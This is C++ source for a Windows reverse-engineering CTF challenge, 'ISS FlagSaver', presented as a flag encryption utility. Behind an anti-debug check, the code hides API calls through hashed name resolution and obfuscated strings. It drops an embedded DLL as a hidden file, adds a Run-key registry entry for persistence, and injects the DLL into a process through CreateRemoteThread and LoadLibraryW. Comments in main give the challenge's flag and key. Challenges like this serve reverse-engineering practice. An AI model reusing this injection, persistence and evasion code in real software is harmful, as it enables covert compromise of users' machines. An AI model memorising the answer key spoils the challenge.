#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <iterator>
#include <codecvt>

#include <Windows.h>
#include <wincrypt.h>
#include <TlHelp32.h>

#include "resource.h"
#include "obfuscate_calls.h"
#include "obfuscate_strings.h"

RESOLVE_TABLE rtSysCallsTable = { {
		{0x7deb3c2b,L"kernel32.dll",NULL},	//GetCurrentProcess			[0]
		{0x0c91118e,L"advapi32.dll",NULL},	//AdjustTokenPrivileges		[1]
		{0x989cbc90,L"advapi32.dll",NULL},	//LookupPrivilegeValueA		[2]		
		{0x1d22a836,L"advapi32.dll",NULL},	//RegCreateKeyW				[3]
		{0x86a022bc,L"advapi32.dll",NULL},	//RegSetValueExW			[4]
		{0xf5c7cdfe,L"kernel32.dll",NULL},	//OpenProcess				[5]
		{0x02cc55a0,L"kernel32.dll",NULL},	//OpenProcessToken			[6]
		{0x956f14e5,L"kernel32.dll",NULL},	//GetModuleFileName			[7]
		{0xdcecd4e8,L"kernel32.dll",NULL},	//Process32FirstW			[8]
		{0xdd66e2c5,L"kernel32.dll",NULL},	//Process32NextW			[9]
		{0x3c11901f,L"kernel32.dll",NULL},	//CloseHandle				[10]
		{0xa22fa1c6,L"kernel32.dll",NULL},	//CreateToolhelp32Snapshot	[11]
		{0x3f8562ec,L"kernel32.dll",NULL},	//GetModuleHandleW			[12]
		{0x52434e72,L"kernel32.dll",NULL},	//GetProcAddress			[13]
		{0x5dd2d148,L"kernel32.dll",NULL},	//VirtualAllocEx			[14]
		{0x3fba5504,L"kernel32.dll",NULL},	//WriteProcessMemory		[15]
		{0xf2f50d7, L"kernel32.dll",NULL},	//CreateRemoteThread		[16]
		{0x9f8ba757,L"kernel32.dll",NULL},  //CreateFileW               [17]
		{0x0e7682a5,L"kernel32.dll",NULL},  //ReadFile					[18]
		{0x505a6588,L"kernel32.dll",NULL},   // WriteFile	    		[19]
		{0x41d40d85,L"kernel32.dll",NULL},  //DeleteFileA				[20]
} };


_GetCurrentProcess hGetCurrentProcess;
_AdjustTokenPrivileges hAdjustTokenPrivileges;
_LookupPrivilegeValueA hLookupPrivilegeValueA;
_RegCreateKeyW hRegCreateKey;
_RegSetValueExW hRegSetValueEx;
_OpenProcess hOpenProcess;
_OpenProcessToken hOpenProcessToken;
_GetModuleFileName hGetModuleFileName;
_Process32FirstW hProcess32FirstW;
_Process32NextW hProcess32NextW;
_CloseHandle hCloseHandle;
_CreateToolhelp32Snapshot hCreateToolhelp32Snapshot;
_GetModuleHandleW hGetModuleHandle;
_GetProcAddress hGetProcAddress;
_VirtualAllocEx hVirtualAllocEx;
_WriteProcessMemory hWriteProcessMemory;
_CreateRemoteThread hCreateRemoteThread;
_CreateFileW hCreateFile;
_ReadFile hReadFile;
_WriteFile hWriteFile;
_DeleteFileA hDeleteFile;

void init_funcs() {
	resolve_init(&rtSysCallsTable, 21);
	hGetCurrentProcess = (_GetCurrentProcess)rtSysCallsTable.reEntries[0].lpAddr;
	hAdjustTokenPrivileges = (_AdjustTokenPrivileges)rtSysCallsTable.reEntries[1].lpAddr;
	hLookupPrivilegeValueA = (_LookupPrivilegeValueA)rtSysCallsTable.reEntries[2].lpAddr;
	hRegCreateKey = (_RegCreateKeyW)rtSysCallsTable.reEntries[3].lpAddr;
	hRegSetValueEx = (_RegSetValueExW)rtSysCallsTable.reEntries[4].lpAddr;
	hOpenProcess = (_OpenProcess)rtSysCallsTable.reEntries[5].lpAddr;
	hOpenProcessToken = (_OpenProcessToken)rtSysCallsTable.reEntries[6].lpAddr;
	hGetModuleFileName = (_GetModuleFileName)rtSysCallsTable.reEntries[7].lpAddr;
	hProcess32FirstW = (_Process32FirstW)rtSysCallsTable.reEntries[8].lpAddr;
	hProcess32NextW = (_Process32NextW)rtSysCallsTable.reEntries[9].lpAddr;
	hCloseHandle = (_CloseHandle)rtSysCallsTable.reEntries[10].lpAddr;
	hCreateToolhelp32Snapshot = (_CreateToolhelp32Snapshot)rtSysCallsTable.reEntries[11].lpAddr;
	hGetModuleHandle = (_GetModuleHandleW)rtSysCallsTable.reEntries[12].lpAddr;
	hGetProcAddress = (_GetProcAddress)rtSysCallsTable.reEntries[13].lpAddr;
	hVirtualAllocEx = (_VirtualAllocEx)rtSysCallsTable.reEntries[14].lpAddr;
	hWriteProcessMemory = (_WriteProcessMemory)rtSysCallsTable.reEntries[15].lpAddr;
	hCreateRemoteThread = (_CreateRemoteThread)rtSysCallsTable.reEntries[16].lpAddr;
	hCreateFile = (_CreateFileW)rtSysCallsTable.reEntries[17].lpAddr;
	hReadFile = (_ReadFile)rtSysCallsTable.reEntries[18].lpAddr;
	hWriteFile = (_WriteFile)rtSysCallsTable.reEntries[19].lpAddr;
	hDeleteFile = (_DeleteFileA)rtSysCallsTable.reEntries[20].lpAddr;
}


void GetDllPath(const wchar_t* in_dllName, std::wstring& out_dllPath);
void Inject(std::wstring& dllPath, std::wstring& processName);
DWORD GetProcessIdentificator(std::wstring& processName);

BOOL setPrivileges(LPCTSTR szPrivName)
{

	TOKEN_PRIVILEGES tp = { 0 };
	HANDLE hToken = 0;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!OpenProcessToken(hGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return TRUE;
	}


	if (!LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].Luid)) {
		return TRUE;
	}


	if (!hAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
	{
		hCloseHandle(hToken);
		return TRUE;
	}

	return FALSE; // ok!
}

const int PATH_LEN = 128;

void GetDllPath(const wchar_t* in_dllName, std::wstring& out_dllPath) {
	WCHAR currentPath[PATH_LEN];
	hGetModuleFileName(NULL, currentPath, PATH_LEN);
	out_dllPath = currentPath;
	out_dllPath = out_dllPath.substr(0, out_dllPath.find_last_of('\\') + 1);
	out_dllPath.append(in_dllName);
}

DWORD GetProcessIdentificator(std::wstring& processName) {
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = hCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD processId = NULL;
	if (hProcess32FirstW(snapshot, &processEntry)) {
		while (hProcess32NextW(snapshot, &processEntry)) {
			if (!_wcsicmp(processEntry.szExeFile, processName.c_str())) {
				processId = processEntry.th32ProcessID;
				break;
			}
		}
	}
	hCloseHandle(snapshot);
	return processId;
}

std::string ws2s(const std::wstring& wstr)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.to_bytes(wstr);
}

std::wstring s2ws(const std::string& str)
{
	using convert_typeX = std::codecvt_utf8<wchar_t>;
	std::wstring_convert<convert_typeX, wchar_t> converterX;

	return converterX.from_bytes(str);
}

BOOL proceed_injection(std::wstring& dllPath, std::wstring& processName)
{
	bool bProcFound = false;
	DWORD processId = NULL;
	while (!bProcFound) {
		processId = GetProcessIdentificator(processName);
		if (processId != NULL) {
			bProcFound = true;
			Sleep(10);
		}
		else {
			continue;
		}
	}
	HANDLE victProc = hOpenProcess(PROCESS_CREATE_THREAD
		| PROCESS_QUERY_INFORMATION
		| PROCESS_VM_OPERATION
		| PROCESS_VM_WRITE
		| PROCESS_VM_READ,
		false,
		processId);

	if (victProc) {
		int dwSize = sizeof(wchar_t) * dllPath.length() + 1;
		LPVOID pPathBuffer = (PWSTR)hVirtualAllocEx(victProc, NULL, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (pPathBuffer == NULL) return false;

		hWriteProcessMemory(victProc, pPathBuffer, dllPath.c_str(), dwSize, NULL);
		if (pPathBuffer == NULL) return false;

		HANDLE hRemoteThread = hCreateRemoteThread(victProc, NULL, 0,
			(PTHREAD_START_ROUTINE)hGetProcAddress(hGetModuleHandle(L"kernel32.dll"), cptime_obf("LoadLibraryW")),
			pPathBuffer, 0, NULL);
		if (hRemoteThread == NULL) return false;
		else {
			hCloseHandle(hRemoteThread);
			return TRUE;
		}
		return FALSE;
	}

	return FALSE;
}


constexpr char hexmap[] = { '0', '1', '2', '3', '4', '5', '6', '7',
						   '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

std::wstring hexStr(unsigned char* data, int len)
{
	std::wstring s(len * 2, ' ');
	for (int i = 0; i < len; ++i) {
		s[2 * i] = hexmap[(data[i] & 0xF0) >> 4];
		s[2 * i + 1] = hexmap[data[i] & 0x0F];
	}
	return s;
}


BOOL inject(){
	HRSRC dll_res = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
	unsigned int dll_size = SizeofResource(NULL, dll_res);
	HGLOBAL dll_handle = LoadResource(NULL, dll_res);
    void* payload = LockResource(dll_handle);

	std::string secret(cptime_obf("secret.dll"));
	std::wstring wsecret = s2ws(secret);
	HANDLE dll = hCreateFile(wsecret.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN,
		NULL);
	
	BOOL bErrorFlag = FALSE;
	DWORD dwBytesWritten = 0;


	if (dll != INVALID_HANDLE_VALUE) {
		bErrorFlag = hWriteFile(
			dll,           
			payload,     
			dll_size,  
			&dwBytesWritten, 
			NULL);
	}
	hCloseHandle(dll);

	std::wstring injector_path;
	std::string injector_name(cptime_obf("ISSFlagSaver.exe"));
	std::wstring injector_wname = s2ws(injector_name);
	GetDllPath(injector_wname.c_str(), injector_path);
	HKEY hkey = NULL;

	std::string registry_entry(cptime_obf("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
	LONG createStatus = hRegCreateKey(HKEY_CURRENT_USER, s2ws(registry_entry).c_str(), &hkey);
	std::string data(cptime_obf("maybe there are some hidden dll somewhere..."));
	LONG status = hRegSetValueEx(hkey, s2ws(data).c_str(), 0, REG_SZ, (BYTE*)injector_path.c_str(), (injector_path.size() + 1) * sizeof(wchar_t));
	std::wstring dllPath;

	GetDllPath(wsecret.c_str(), dllPath);
	
	BOOL res = proceed_injection(dllPath, injector_wname);
	if (res) {
		std::cout << cptime_obf("Inspecting database...\n");
	}
	return res;
}

std::string string_to_hex(const std::string& input)
{
	static const char hex_digits[] = "0123456789abcdef";

	std::string output;
	output.reserve(input.length() * 2);
	for (unsigned char c : input)
	{
		output.push_back(hex_digits[c >> 4]);
		output.push_back(hex_digits[c & 15]);
	}
	return output;
}

std::string hex_to_string(const std::string& input)
{
	static const char* const lut = "0123456789abcdef";
	size_t len = input.length();
	if (len & 1) {
		std::cout << "Incorrect input!\n";
		exit(0);
	}

	std::string output;
	output.reserve(len / 2);
	for (size_t i = 0; i < len; i += 2)
	{
		char a = input[i];
		const char* p = std::lower_bound(lut, lut + 16, a);
		if (*p != a) {
			std::cout << "Incorrect input!\n";
			exit(0);
		}
		char b = input[i + 1];
		const char* q = std::lower_bound(lut, lut + 16, b);
		if (*q != b) {
			std::cout << "Incorrect input!\n";
			exit(0);
		}

		output.push_back(((p - lut) << 4) | (q - lut));
	}
	return output;
}

void start() {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	std::cout << "Hello! Welcome to reverse challenge by ";
	SetConsoleTextAttribute(hConsole, 11);
	std::cout << "@fuunyaka";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << " (pm me on telegram if you have any questions).\n" << std::endl;
	return;
}


void hello() {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 9);
	std::cout << R"(
  ___ ____ ____    _____ _             ____                       
 |_ _/ ___/ ___|  |  ___| | __ _  __ _/ ___|  __ ___   _____ _ __ 
  | |\___ \___ \  | |_  | |/ _` |/ _` \___ \ / _` \ \ / / _ \ '__|
  | | ___) |__) | |  _| | | (_| | (_| |___) | (_| |\ V /  __/ |   
 |___|____/____/  |_|   |_|\__,_|\__, |____/ \__,_| \_/ \___|_|   
                                 |___/                          
		)" << std::endl;
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "Commands:\n    v - view database of encrypted flags\n    b - exit program\n    d - decrypt flag\n    e - encrypt flag\n";
	SetConsoleTextAttribute(hConsole, 12);
	std::cout<<"      * key must be in hexademical format and generated by CryptGenKey WinAPI function for RSA!\n      Example:\n       Enter the key:\n       > 080200000166000008000000f10e257c6bce0d34\n" << std::endl;
	SetConsoleTextAttribute(hConsole, 7);
	
	SetErrorMode(100);
	bool patch_me = SetErrorMode(1024) == 100;
	if (patch_me) {
		init_funcs();
		inject();
	}
}

std::vector<std::string> database = { "8a0cefd2becd5d7a2073141837193fc11d02e1a23b731c42d3c1b89fc221f5935ac761b574517a6df26a8a74d95cd44f" };

bool is_number(const std::string& s)
{
	return !s.empty() && std::find_if(s.begin(),
		s.end(), [](unsigned char c) { return !std::isdigit(c); }) == s.end();
}

int decrypt_flag() {

	std::cout << "Enter the flag number to decrypt:\n";
	std::cout << "> ";
	std::string inp;
	std::cin >> inp;
	if (!is_number(inp)) {
		std::cout << "Invalid number!\nExiting program...\nDone!" << std::endl;
		_exit(0);
	}
	int flag_num = std::stoi(inp);
	
	
	std::string ecn_flag = hex_to_string(database[flag_num]);

	PBYTE bFlag = (PBYTE)malloc(ecn_flag.size() + 1);
	for (std::size_t i = 0; i < ecn_flag.size(); i++) {
		bFlag[i] = ecn_flag[i];
	}
	bFlag[ecn_flag.size()] = 0;

	std::cout << "Enter the key:\n";
	std::cout << "> ";
	std::string key;
	std::cin >> key;
	std::string key_inp = hex_to_string(key);

	std::cout << std::endl;

	HCRYPTPROV hCryptProv = NULL;
	BYTE bKey[20];
	for (std::size_t i = 0; i < key_inp.size(); i++) {
		bKey[i] = key_inp[i];
	}


	LPCWSTR lpwContextName = L"Flag";
	BOOL bIsSecceeded = CryptAcquireContext(&hCryptProv, lpwContextName, NULL, PROV_RSA_FULL, 0);

	if (!bIsSecceeded)
		bIsSecceeded = CryptAcquireContext(&hCryptProv, lpwContextName, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET);

	HCRYPTKEY hKey;
	CryptImportKey(hCryptProv, bKey, sizeof(bKey), 0, CRYPT_EXPORTABLE, &hKey);

	DWORD dwEncLen = ecn_flag.size();
	bIsSecceeded = CryptDecrypt(hKey, NULL, TRUE, CRYPT_OAEP, bFlag, &dwEncLen);

	std::cout << "Your flag: ";

	for (auto i = 0; i < dwEncLen; i++) {
		std::cout << bFlag[i];
	}

	std::cout << std::endl;

	CryptDestroyKey(hKey);

	CryptReleaseContext(hCryptProv, 0);
	return 0;
}

void view_database() {
	std::cout << "Flags database:\n";
	for (int i = 0; i < database.size(); i++) {
		std::cout << '[' << i << ']' << "  " << database[i] << std::endl;;
	}
	std::cout << std::endl;
}

void encrypt_flag() {
	std::cout << "Enter the flag to encrypt:\n";
	std::cout << "> ";
	std::string flag;
	std::cin >> flag;
	

	std::cout << "Enter the key:\n";
	std::cout << "> ";
	std::string key;
	std::cin >> key;
	std::string key_inp = hex_to_string(key);

	std::cout << std::endl;
	BYTE bKey[20];
	for (std::size_t i = 0; i < key_inp.size(); i++) {
		bKey[i] = key_inp[i];
	}

	HCRYPTPROV hCryptProv = NULL;
	LPCWSTR lpwContextName = L"Flag";
	BOOL bIsSecceeded = CryptAcquireContext(&hCryptProv, lpwContextName, NULL, PROV_RSA_FULL, 0);

	if (!bIsSecceeded)
		bIsSecceeded = CryptAcquireContext(&hCryptProv, lpwContextName, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET);

	HCRYPTKEY hKey;
	CryptImportKey(hCryptProv, bKey, sizeof(bKey), 0, CRYPT_EXPORTABLE, &hKey);

	DWORD count = flag.size();
	std::vector<BYTE> encrypted_vector(flag.begin(), flag.end());
	encrypted_vector.resize(1024);
	bIsSecceeded = CryptEncrypt(hKey, NULL, TRUE, CRYPT_OAEP, (PBYTE)encrypted_vector.data(), &count, encrypted_vector.size());

	std::string encrypted_flag = string_to_hex(std::string(encrypted_vector.begin(), encrypted_vector.begin()+count));
	database.push_back(encrypted_flag);
	std::size_t number = database.size() - 1;
	std::cout << "Encrypted flag successfully added to database!\nFlag number: " << number << std::endl << std::endl;

}

int main()
{
	
	//8a0cefd2becd5d7a2073141837193fc11d02e1a23b731c42d3c1b89fc221f5935ac761b574517a6df26a8a74d95cd44f - flag
	//080200000166000008000000f10e257c6bce0d34 - key
	//FLAG = "orenctf{n0ne_c4n_3sc4p3_my_r3v3rs3r5_v1s10n}"
	
	start();
	hello();
	std::string inp = "\0";
	while (inp[0] != 'b') {
		std::cout << "> ";
		std::cin >> inp;
		std::cout << std::endl;
		if (inp.size() != 1) {
			std::cout << "Error...\n";
			return 0;
		}
		switch (inp[0])
		{
		case 'd':
		{
			decrypt_flag();
			break;
		}
		case 'e':
		{
			encrypt_flag();
			break; 
		}
		case 'v':
		{
			view_database();
			break; 
		}
		default:
			break;
		}
	}
	std::cout << "Exiting ISS FlagSaver...\nDone!" << std::endl;
	return 0;
	
}